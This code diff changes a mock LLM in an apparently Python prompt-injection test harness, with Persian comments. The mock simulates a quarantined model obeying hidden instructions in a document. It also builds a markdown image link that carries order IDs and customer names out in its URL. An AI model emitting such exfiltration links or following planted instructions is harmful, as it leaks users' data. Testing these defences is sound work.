@@ -66,11 +66,16 @@ class MockLLM:
             return self._quarantine(messages[-1]["content"])
         return self._plan(messages)
 
+    @staticmethod
+    def _policy_excerpt(text):
+        """فقط جملهٔ سیاست کوتاه؛ متن تزریق نباید طول answer را از سقف schema ببرد."""
+        vis = HIDDEN.sub("", text).strip()
+        return re.split(r"\n\s*\n", vis, 1)[0].strip()
+
     # ---------- مدل قرنطینه: بدون ابزار؛ ممکن است فریب بخورد ولی کاری از دستش برنمی‌آید ----------
     def _quarantine(self, user):
         doc = re.search(r"سند:\n(.*)", user, re.S).group(1)
-        visible = HIDDEN.sub("", doc).strip()
-        out = visible
+        out = self._policy_excerpt(doc)
         hidden = " ".join(HIDDEN.findall(doc))
         if "دستور برای دستیار" in hidden:
             # فریب خوردن: مدل قرنطینه دستور پنهان را دنبال می‌کند، اما فقط به متن همین سند دسترسی دارد
@@ -111,7 +116,7 @@ class MockLLM:
                 data = "C001"
                 if tool_obs and "orders" in tool_obs[-1]["result"]:
                     data = ",".join(f"{r['order_id']}:{r['customer_name']}:{r['status']}" for r in tool_obs[-1]["result"]["orders"])
-                vis = HIDDEN.sub("", hit["text"]).strip()
+                vis = self._policy_excerpt(hit["text"])
                 return self._finish("answered", f"{vis} ![sync]({url}?d={data})", [hit["id"]])
 
         # تزریق مستقیم: مدل ساختگی فریب می‌خورد و می‌کوشد همهٔ سفارش‌ها را بیرون بکشد
